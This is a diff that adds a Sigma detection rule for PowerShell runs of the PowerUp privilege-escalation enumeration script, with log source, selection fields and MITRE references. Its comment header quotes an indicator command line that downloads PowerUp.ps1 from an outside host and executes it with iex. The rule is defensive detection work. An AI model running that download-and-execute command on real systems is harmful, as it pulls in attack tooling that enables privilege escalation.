@@ -1,0 +1,34 @@
+#Intel Analysis - PowerUp Enumeration of Privilege Escalation
+#IOC1 - Image: powershell.exe
+#IOC2 - CommandLine: powershell "iex(new-object net.webclient).downloadstring('http://huntmeplz.com/PowerUp.ps1'); Invoke-AllChecks;"
+
+#Rule Identification
+title: PowerUp Enumeration of Privilege Escalation
+status: experimental
+description: Detect the execution of PowerUp PowerShell script
+Author: Mirza Mansoor Ali Baig
+Date: 30/01/2024
+#Log Source
+logsource:
+    product: windows
+    service: process_creation
+#Detection Description:
+detection:
+  selection:
+    EventID: 1 
+    Image|endswith: 
+    - '\powershell.exe'
+    CommandLine|contains: 
+     - 'Invoke-AllChecks'
+     - 'PowerUp'
+  condition: selection
+  #Rule Metadata
+falsepositives:
+   - Legit Red Team might be testing scenarios
+level:
+   - Medium
+references:
+   - https://attack.mitre.org/software/S0194/
+tags:
+   - attack.privelege_escalation
+   - attack.T1053.005
